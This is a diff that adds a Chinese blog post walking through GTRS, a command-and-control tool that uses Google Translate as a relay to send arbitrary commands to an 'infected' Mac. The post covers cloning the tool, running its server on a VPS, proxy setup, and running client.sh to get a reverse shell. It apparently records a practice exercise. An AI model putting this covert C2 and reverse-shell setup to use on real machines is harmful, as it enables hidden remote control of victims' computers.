@@ -229,6 +229,153 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/zejunyang/zejunyang.github.io.git/2018/12/02/GTRS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="miyin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="miyin的修行之地">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/02/GTRS/" itemprop="url">GTRS-使用Google Translator作为代理，向受感染的计算机发送任意命令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-02T14:26:31+08:00">
+                2018-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>使用Google Translator作为代理，向受感染的计算机发送任意命令<br>受感染机器 ==HTTPS==&gt;【Google Translator】==HTTP==&gt;【C2】<br>在灰炮技能知识星球看到，遂实践之。</p>
+<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>需要一个VPS和一个域名，并绑定域名和VPS的公网ip。<br>免费域名可从<a href="https://www.freenom.com" target="_blank" rel="noopener">freenom</a>获取</p>
+<p>如果受感染机器在国内，还需要保证其能访问<a href="https://translate.google.com/。后文会介绍mac下终端走代理的方式。" target="_blank" rel="noopener">https://translate.google.com/。后文会介绍mac下终端走代理的方式。</a></p>
+<h2 id="GTRS实现过程"><a href="#GTRS实现过程" class="headerlink" title="GTRS实现过程"></a>GTRS实现过程</h2><p>环境：<br>macOS：受感染机器<br>centos6/VPS：C2</p>
+<h3 id="第一步：在VPS上执行server-py"><a href="#第一步：在VPS上执行server-py" class="headerlink" title="第一步：在VPS上执行server.py"></a>第一步：在VPS上执行server.py</h3><pre><code>[root@host ~]# git clone https://github.com/mthbernardes/GTRS
+[root@host ~]# cd GTRS
+</code></pre><p><img src="/images/30.png" alt="avatar"><br>此处需要用python2.7执行server.py,但是我的VPS的centos6，默认是python2.6，因此需在centos6上安装python2.7，我安装的是python2.7.15,参考的是<a href="https://teddysun.com/473.html" target="_blank" rel="noopener">秋水逸冰前辈的教程</a>。</p>
+<p>安装好后，执行server.py:</p>
+<pre><code>[root@host GTRS]# python2.7 server.py
+</code></pre><p><img src="/images/31.png" alt="avatar"></p>
+<h3 id="第二步：在受感染机器执行client-sh"><a href="#第二步：在受感染机器执行client-sh" class="headerlink" title="第二步：在受感染机器执行client.sh"></a>第二步：在受感染机器执行client.sh</h3><p>执行前，需要先在client.sh的第5行设置域名。<br><img src="/images/32.png" alt="avatar"></p>
+<p>因为我假设受感染机器是国内的mac，此处要使其能访问<a href="https://translate.google.com/，需要做以下设置：" target="_blank" rel="noopener">https://translate.google.com/，需要做以下设置：</a><br>以zsh为例，(mac下zsh使用的教程 &gt;&gt;&gt; <a href="https://zhuanlan.zhihu.com/p/19556676" target="_blank" rel="noopener">教程1</a><a href="https://thief.one/2017/06/27/1/" target="_blank" rel="noopener">教程2</a>)</p>
+<pre><code>➜  ~ vim ~/.zshrc
+</code></pre><p>添加如下代理配置:</p>
+<h1 id="proxy-list"><a href="#proxy-list" class="headerlink" title="proxy list"></a>proxy list</h1><p>alias proxy=’export all_proxy=socks5://127.0.0.1:1080’<br>alias unproxy=’unset all_proxy’<br><img src="/images/33.png" alt="avatar"><br>:wq保存退出</p>
+<pre><code>➜  ~ source ~/.zshrc
+</code></pre><p>查看当前ip：</p>
+<pre><code>➜  ~ curl cip.cc 
+</code></pre><p><img src="/images/34.png" alt="avatar"></p>
+<p>开启shadowssocks，绑定本地1080端口，并执行以下命令：</p>
+<pre><code>➜  ~ proxy
+</code></pre><p>再次查看当前ip：</p>
+<pre><code>➜  ~ curl cip.cc 
+</code></pre><p><img src="/images/35.png" alt="avatar"></p>
+<p>mac终端走代理成功，此时执行client.sh,成功获取反向shell</p>
+<pre><code>➜  GTRS git:(master) ✗ bash client.sh
+</code></pre><p><img src="/images/36.png" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/zejunyang/zejunyang.github.io.git/2018/10/24/cve-2018-3191/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -937,7 +1084,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
